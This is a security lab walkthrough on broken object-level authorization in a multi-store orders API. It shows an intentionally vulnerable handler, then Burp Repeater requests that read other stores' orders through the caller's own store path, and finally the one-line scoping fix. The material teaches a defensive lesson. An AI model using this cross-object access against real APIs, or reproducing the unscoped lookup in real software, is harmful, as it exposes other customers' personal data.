# Walkthrough — bola-nested-resource

## 1. Context

A multi-store back-office API serves `GET /stores/:storeId/orders/:orderId`. It checks, correctly, that you operate the store named in the path — ask for a store that isn't yours and it answers `403` — and then it returns the order without checking that the order belongs to that store. That is **BOLA (Broken Object Level Authorization)** — the #1 risk in the OWASP API Security Top 10 (**API1:2023**), and the API-shaped face of IDOR (insecure direct object reference).

The resource is **nested**: an object addressed *through its parent* in the path. The store is the **parent**, the order is the **child**, and a store's **scope** is the set of orders that belong to it. People are **operators** of a store — they work there, they don't own it, and every operator of a store sees all of that store's orders.

The seed, in one breath: three stores — `harbor`, `meadow`, `summit` — and you are `clancy`, who operates `harbor` and nothing else. Twelve orders sit on one global id counter, `1001`–`1012`, split three, four, and five across the stores. Each order carries the buyer's name, delivery address, item, and amount — the PII (personally identifiable information) that turns this from a curiosity into a finding.

This is an **API — there is no browser track.** Every request below is a block you paste into **Burp Repeater** (which resends a single request so you can edit and observe it). If you haven't wired up Burp yet, the same requests run under `curl`. That is the whole toolset.

Two path parameters means two things to keep straight at all times, so **every request block below is preceded by a label line** naming the store in the path and the order in the path, and whose each one is. Read the label before the request.

## 2. Spot the bug

Open [`vulnerable/app.ts`](./vulnerable/app.ts). The vulnerable handler is ten lines:

```ts
app.get("/stores/:storeId/orders/:orderId", (req, res) => {
  const caller = authenticate(req);
  if (caller === null) return res.sendStatus(401);                        // AUTHENTICATION
  if (!operates(caller, req.params.storeId)) return res.sendStatus(403);  // parent check: real, and it bites
  // VULNERABLE: the lookup is GLOBAL. The caller operates :storeId, but order.storeId is
  // never compared to it -- an order from ANY store comes back.
  const order = ORDERS[Number(req.params.orderId)];
  if (!order) return res.sendStatus(404);
  res.json(order);
});
```

The handler makes three decisions, and only the third one is wrong. It authenticates the caller (`401`). It authorizes the **parent** (`403`). Then it resolves the **child** — out of the platform-wide collection, with nothing, anywhere, comparing the order's store to the store that was just authorized.

- **There is authorization here, and it works.** `operates(...)` is a real lookup against a real table of store-to-operator links, and it really does answer `403`. You will send the request that proves it in Step 2. This is not the handler of `bola-sequential-id` or `bola-uuid-leaked`, where the detail route carried no object-level check at all and nothing sat beside the gap to disguise it.
- **Read the signature, not the name.** `operates(caller, req.params.storeId)` takes the caller and the store. **The order is not an argument.** By construction, the question this check answers cannot be about the order — and "does this order belong to this store?" is the question that would have stopped the exploit.
- **The lookup is global.** `ORDERS[...]` is the platform-wide collection of all twelve orders. Now look one route above, at the list endpoint in the same file: `GET /stores/:storeId/orders` answers with `ordersOf(req.params.storeId)`, the store's own orders, filtered by `o.storeId === storeId`. The developer knew how to scope a response to the parent and wrote the helper that does it. They just didn't use it on the by-id route. **List scoped to the parent, detail read from the global collection — that asymmetry is the signature of nested-resource BOLA.**
- **This class doesn't `grep`.** There's no dangerous string to search for — no template sink, no `eval`, no concatenated query. What you're hunting is a missing question standing next to a question that's present, which is a good deal harder to see than a missing question standing alone.

## 3. How auth works in this lab

`POST /login` takes a username and returns an **opaque Bearer token** — a random string the server stores in a `token -> user` map and resolves on every request. It asks for no password: that is a deliberate lab shortcut, not part of the bug. The token is *opaque* — a value that carries no readable structure, unlike a JWT (JSON Web Token) whose payload you could decode — so there is nothing inside it to inspect or tamper with anyway.

Three layers stack up on this endpoint, and the atom is about the third:

- **Authentication** proves *who you are*. No token, or a bad one, gets `401`.
- **The parent check** proves *that you operate the store in the path*. A store you don't operate gets `403`.
- **The child scope** would prove *that the order belongs to that store*. Nothing does this.

One discipline for the whole walkthrough: **the attack never touches the token.** You log in as yourself and send the token exactly as issued — no decoding, no editing, no forging. The target is the endpoint, not the token.

## 4. Baseline — your token, your store, and what authorized access looks like

Point Burp at the vulnerable API on `127.0.0.1:8203` and work from Repeater.

> **The token below is from one real session.** `POST /login` mints a fresh random token each time, so **yours will differ** — copy your own from each login response into the `Authorization` header. The store slugs and order ids are stable (seeded), so those you can paste verbatim.

Log in as yourself:

> **Logging in as:** `clancy` — you, the operator of `harbor`

```
POST /login HTTP/1.1
Host: 127.0.0.1:8203
Content-Type: application/json

{"user": "clancy"}
```

Response — `200`, a token that is yours for the rest of the session (shown as `<clancy-token>` below):

```json
{"token": "RAP7MNsx1BZW1u5iFVjbWJiVU0q5ksy1"}
```

Log in a second time as `alice`, who operates `meadow`, and keep that token too (shown as `<alice-token>`) — you need it once, at the end of this step:

> **Logging in as:** `alice` — the operator of `meadow`

```
POST /login HTTP/1.1
Host: 127.0.0.1:8203
Content-Type: application/json

{"user": "alice"}
```

Now list the orders of the store you operate:

> **Store in the path:** `harbor` (yours) · **Order in the path:** none — this block asks for the collection

```
GET /stores/harbor/orders HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — `200`, and note it contains **only `harbor`'s three orders**:

```json
[{"id":1004,"storeId":"harbor","customer":"Elena Ruiz","address":"90 Placeholder Rd, Lakeside","item":"4K monitor","amount":"$329.00"},{"id":1008,"storeId":"harbor","customer":"Priya Shah","address":"12 Example Ave, Springfield","item":"Desk mat","amount":"$19.00"},{"id":1011,"storeId":"harbor","customer":"Marcus Webb","address":"7 Sample St, Rivertown","item":"HDMI cable","amount":"$12.99"}]
```

Ids `1004`, `1008`, and `1011` — that is the entire scope of your store, and the API scoped you to it correctly. Read one of them back:

> **Store in the path:** `harbor` (yours) · **Order in the path:** `1011` (a `harbor` order)

```
GET /stores/harbor/orders/1011 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — `200`:

```json
{"id":1011,"storeId":"harbor","customer":"Marcus Webb","address":"7 Sample St, Rivertown","item":"HDMI cable","amount":"$12.99"}
```

Somebody else bought that order and you just read their name and address — and that is **correct**. Operators of the same store legitimately share its orders: `bob` and `carol` both operate `summit` and see the same five orders, and you see every `harbor` order, whoever bought it. That sharing is the feature, not the flaw. What owns an order here is a **store**, not a person, so "I can see an order with a stranger's name on it" is not by itself the bug. Hold that distinction, or the next step will look like the feature working.

One legitimate cross-check before you go on. Order `1009` belongs to `meadow` and `alice` operates `meadow`, so ask for it with **`<alice-token>`**. This is what *authorized* access to that order looks like:

> **Store in the path:** `meadow` (alice's) · **Order in the path:** `1009` (a `meadow` order)

```
GET /stores/meadow/orders/1009 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <alice-token>
```

Response — `200`:

```json
{"id":1009,"storeId":"meadow","customer":"Elena Ruiz","address":"90 Placeholder Rd, Lakeside","item":"Standing desk","amount":"$589.00"}
```

Keep it next to you; in the next step the exact same object comes back to *your* token, through *your* store. (In a real engagement you would not hold alice's token — the lab hands you both logins only so you can see the authorized baseline.)

## 5. Step 1 — Read another store's order through your own store (BOLA confirmed)

There is nothing to guess here. Your own list returned `1004`, `1008`, `1011`, and the ids are **one global counter shared by the whole platform** — so the gaps between your ids are other stores' orders, and `1009` sits right between two of yours.

Ask for `1009` with your own unchanged token, through **your** store:

> **Store in the path:** `harbor` (yours) · **Order in the path:** `1009` (a `meadow` order)

```
GET /stores/harbor/orders/1009 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — **`200`**:

```json
{"id":1009,"storeId":"meadow","customer":"Elena Ruiz","address":"90 Placeholder Rd, Lakeside","item":"Standing desk","amount":"$589.00"}
```

Read the body, then read the request line again. The response says **`"storeId":"meadow"`** to a request whose path said `harbor`. The data knew whose it was and carried the answer along with it; the handler never asked. That is the **BOLA**. Nothing here is a payload — the request is valid by every protocol rule, a WAF (web application firewall) sees nothing wrong, authentication passed, and the store check passed too.

Now prove that the `{storeId}` in the path isn't pointing at anything. Same token, same store in the path, an order from the *third* store:

> **Store in the path:** `harbor` (yours) · **Order in the path:** `1001` (a `summit` order)

```
GET /stores/harbor/orders/1001 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — **`200`**, a `summit` order:

```json
{"id":1001,"storeId":"summit","customer":"Priya Shah","address":"12 Example Ave, Springfield","item":"Mechanical keyboard","amount":"$89.00"}
```

**Two different stores, one door.** The `harbor` in the path does not mean "the other store," and it does not mean "the order's store" — it means nothing at all about the order. It only has to name a store *you* operate, so the check lets you through; after that, any of the twelve ids resolves.

And look across the baseline and this step. Order `1009` in `meadow` came back `200` to `<alice-token>` through `/stores/meadow/...` **and** `200` to `<clancy-token>` through `/stores/harbor/...`. The server resolved both identities correctly and authorized two different parents — then handed over the same child both times, because the authorized store was never compared to the order's store.

## 6. Step 2 — What the vuln is NOT

The exploit is a legitimate request, with a legitimate token, against an endpoint that *does* authorize — so the easiest wrong conclusion to draw is "this handler has no authorization." It has. Three requests, all sent with the same unchanged `<clancy-token>`, pin down what the flaw actually is.

**Request 1 — name the order's real store.**

> **Store in the path:** `meadow` (**not yours**) · **Order in the path:** `1009` (a `meadow` order)

```
GET /stores/meadow/orders/1009 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — **`403`**, body `Forbidden`. The first check exists and it bites. Notice what this request asked for: order `1009` under the store it actually belongs to — and it was refused, because you don't operate `meadow`.

**Request 2 — the feature, working as designed.**

> **Store in the path:** `harbor` (yours) · **Order in the path:** `1011` (a `harbor` order)

```
GET /stores/harbor/orders/1011 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — **`200`**, the `harbor` order. Your store, your store's order: correct.

**Request 3 — the bug.**

> **Store in the path:** `harbor` (yours) · **Order in the path:** `1009` (a `meadow` order)

```
GET /stores/harbor/orders/1009 HTTP/1.1
Host: 127.0.0.1:8203
Authorization: Bearer <clancy-token>
```

Response — **`200`**, the `meadow` order, exactly as in Step 1.

Now the conclusion, which is the whole atom. **`storeId` was checked on all three requests.** It simply has no relationship to the order that comes back. Requests 1 and 3 went through the **very same check** — the same line, the same `operates(caller, storeId)` lookup — and it refused one and approved the other for reasons that have nothing to do with the order: request 1 even named the order's real store and was refused, while request 3 named an unrelated store and was served. Between 2 and 3 only the order changed, and the verdict didn't. Between 1 and 3 only the store changed, and the verdict flipped. The parameter that gets authorized and the object that gets delivered are independent of each other — and that independence is the bug.

> **Authorization present is not authorization sufficient — what matters is which question it answers.**

That is what separates this atom from its two companions. In `bola-sequential-id` and `bola-uuid-leaked` the question was missing outright: the detail handler resolved the caller and then asked nothing whatsoever about the object, and the repair was to add the question. Here the question was not missing — it was **replaced by a neighbour that passes for it**. A reviewer reading this handler sees a `403` near the top and moves on; the gap is camouflaged by the check standing next to it.

It is not an authentication failure either. Drop the `Authorization` header from any request above and you get `401` (body `Unauthorized`); flip a character in the token and you get `401` too. You were authenticated as `clancy`, correctly and continuously, from the first request to the last.

## 7. Why the fix works (port 8303)

Point Burp at the fixed API on `127.0.0.1:8303` and log in there — each build keeps its own token map, so you need fresh tokens — then replay the chain:

- **The parent check is untouched.** `GET /stores/meadow/orders/1009` with your `<clancy-token>` → **`403`**, exactly as on 8203. That line is byte-identical in both builds; it was never the broken part.
- **The feature is untouched.** `GET /stores/harbor/orders/1011` → `200`, and `GET /stores/harbor/orders` still returns your three orders. `GET /stores/meadow/orders/1009` with `<alice-token>` → `200`: operators still read their own store's orders. No token still gets `401`.
- **The exploit is gone, and it leaves no trace of itself.** `GET /stores/harbor/orders/1009` → **`404`**. `GET /stores/harbor/orders/1001` → **`404`**. Now ask for `GET /stores/harbor/orders/1013`, an id that was never seeded — **`404`** as well, with the same body (`Not Found`) and the same length. From inside your own store, an order that exists in another store and an order that exists nowhere are one and the same answer, which leaves you no **enumeration oracle**: no difference in the responses to map which ids are real from, without reading any of them.

The one-line change behind all of that: the fixed handler looks the order up **inside the authorized store** instead of in the platform-wide collection — the same scope the list endpoint one route above was already using. An order from another store is *not found*, rather than found and then refused.

Two things worth carrying into [`DIFF.md`](./DIFF.md), which works them through: why the parent answers `403` while the child answers `404`, and why this fix moved the *lookup* instead of adding a predicate to the guard, the way the two companion atoms did.

The walkthrough ends here. The finding is the cross-store read and the store parameter that turned out to authorize nothing about the object it delivered; the fix is one line, in the lookup. To go deeper on the class, the theory primer's PortSwigger page is the place.
